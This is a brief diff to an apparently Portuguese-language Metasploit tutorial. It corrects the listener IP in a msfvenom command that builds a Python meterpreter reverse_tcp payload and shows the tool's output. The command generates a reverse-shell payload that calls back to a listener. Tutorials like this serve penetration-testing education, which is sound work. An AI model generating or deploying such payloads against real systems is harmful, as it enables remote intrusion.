@@ -60,7 +60,7 @@ msf payload(python/meterpreter/reverse_tcp) > exit
 ```
 Criamos o payload informando o IP e a porta de escuta:
 ```
-$ msfvenom -p python/meterpreter/reverse_tcp LHOST="191.168.1.10" LPORT=6666 >>meu_payload.py
+$ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=6666 >>meu_payload.py
 [-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
 [-] No arch selected, selecting arch: python from the payload
 No encoder specified, outputting raw payload
